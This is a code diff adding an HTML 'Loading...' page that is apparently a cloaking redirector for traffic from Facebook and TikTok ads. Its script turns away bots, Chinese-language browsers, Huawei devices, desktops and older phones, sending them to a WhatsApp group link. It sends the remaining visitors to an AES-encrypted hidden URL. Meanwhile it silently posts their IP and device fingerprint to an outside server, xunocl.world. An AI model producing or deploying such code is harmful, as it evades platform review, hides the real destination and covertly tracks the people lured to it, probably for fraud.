@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading...</title>
+    <style>
+      #loading {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        background: rgba(255, 255, 255, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+      .spinner {
+        width: 50px;
+        height: 50px;
+        border: 6px solid #ccc;
+        border-top-color: #333;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      #loadingText {
+        font-size: 24px;
+        color: #333;
+        margin-top: 10px;
+      }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  </head>
+  <body>
+    <div id="loading">
+      <div class="spinner"></div>
+      <div id="loadingText">Loading...</div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", async () => {
+        const startTime = performance.now();
+
+        // 超快速设备检测（纯前端，无需网络请求）
+        const quickResult = await ultraQuickCheck();
+
+        if (!quickResult.pass) {
+          console.log("快速检测不通过:", quickResult.reason);
+          window.location.replace(
+            "https://chat.whatsapp.com/E16X46arn0h36nzi8qL1S9"
+          );
+          return;
+        }
+
+        // 快速检测通过，立即跳转
+        const endTime = performance.now();
+        console.log("检测耗时: " + (endTime - startTime) + " 毫秒");
+
+        // 使用默认key直接跳转
+        showline("MemYN0DB9oweJBc4zO0pS3J7V0SmPUGkyA9mwyE3WSY=");
+
+        // 异步发送数据到后端（不阻塞跳转）
+        setTimeout(() => {
+          sendDataToBackend();
+        }, 100);
+      });
+
+      // 超快速设备检测函数
+      async function ultraQuickCheck() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const userLanguage = navigator.language || navigator.userLanguage;
+
+        // 1. 检测华为设备
+        if (userAgent.includes("huawei") || userAgent.includes("honor")) {
+          return { pass: false, reason: "华为设备" };
+        }
+
+        // 2. 检测爬虫
+        if (
+          userAgent.includes("bot") ||
+          userAgent.includes("crawler") ||
+          userAgent.includes("spider")
+        ) {
+          return { pass: false, reason: "爬虫检测" };
+        }
+
+        // 3. 检测中文浏览器
+        if (userLanguage && userLanguage.includes("zh")) {
+          return { pass: false, reason: "中文浏览器" };
+        }
+
+        // 4. 检测移动设备（如果需要）
+        const isMobile =
+          /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+            navigator.userAgent
+          );
+        if (!isMobile) {
+          return { pass: false, reason: "非移动设备" };
+        }
+
+        // 5. 检测iOS版本（简化版）
+        if (userAgent.includes("iphone") || userAgent.includes("ipad")) {
+          const match = userAgent.match(/os (\d+)_(\d+)/);
+          if (match) {
+            const major = parseInt(match[1]);
+            const minor = parseInt(match[2]);
+            if (major < 16 || (major === 16 && minor <= 6)) {
+              return { pass: false, reason: "iOS版本过低" };
+            }
+          }
+        }
+
+        // 6. 检测三星低端设备（简化版）
+        if (userAgent.includes("samsung")) {
+          const match = userAgent.match(/sm-g(\d+)/i);
+          if (match) {
+            const modelNumber = parseInt(match[1]);
+            if (modelNumber < 960) {
+              return { pass: false, reason: "三星低端设备" };
+            }
+          }
+        }
+
+        return { pass: true, reason: "快速检测通过" };
+      }
+
+      // 异步发送数据到后端
+      async function sendDataToBackend() {
+        try {
+          const urlParams = new URLSearchParams(window.location.search);
+          const hasQueryParams = urlParams.toString() !== "";
+
+          // 获取IP（异步，不阻塞）
+          let ip = "unknown";
+          try {
+            const response = await fetch("get_ip_info.php");
+            const data = await response.json();
+            ip = data.ip;
+          } catch (e) {
+            console.log("获取IP失败，使用默认值");
+          }
+
+          // 发送数据到后端（不等待响应）
+          fetch("https://xunocl.world/fbVpnStock/protectLink", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              domainName: window.location.host + window.location.pathname,
+              userIp: ip,
+              userMobile: /Mobile|Android|iPhone/i.test(navigator.userAgent)
+                ? "Mobile"
+                : "PC",
+              paraPath: hasQueryParams,
+              isIOSS: /iPhone|iPad|iPod/i.test(navigator.userAgent)
+                ? "iOS"
+                : /Android/i.test(navigator.userAgent)
+                ? "Android"
+                : "Other",
+              fb: urlParams.has("fbclid")
+                ? "Facebook链接访问的。"
+                : urlParams.has("ttclid")
+                ? "TikTok链接访问的。"
+                : "不是Facebook或TikTok",
+              screenWidth: window.screen.width,
+              screenHeight: window.screen.height,
+              pixelRatio: window.devicePixelRatio,
+              continent: Intl.DateTimeFormat()
+                .resolvedOptions()
+                .timeZone.split("/")[0],
+              userLanguage: navigator.language || navigator.userLanguage,
+              userAgent: navigator.userAgent,
+              isMobile: /Mobile|Android|iPhone/i.test(navigator.userAgent),
+            }),
+          }).catch((error) => {
+            console.log("数据发送失败:", error);
+          });
+        } catch (error) {
+          console.log("异步数据发送错误:", error);
+        }
+      }
+
+      function decryptAes(encryptedData, key) {
+        var bytes = CryptoJS.AES.decrypt(
+          encryptedData,
+          CryptoJS.enc.Base64.parse(key),
+          {
+            mode: CryptoJS.mode.ECB,
+            padding: CryptoJS.pad.Pkcs7,
+          }
+        );
+        var decryptedData = bytes.toString(CryptoJS.enc.Utf8);
+        return decryptedData;
+      }
+
+      function showline(keyy) {
+        var url = "MemYN0DB9oweJBc4zO0pS3J7V0SmPUGkyA9mwyE3WSY=";
+        var originalData = decryptAes(url, keyy);
+        window.location.replace(originalData);
+      }
+    </script>
+  </body>
+</html>
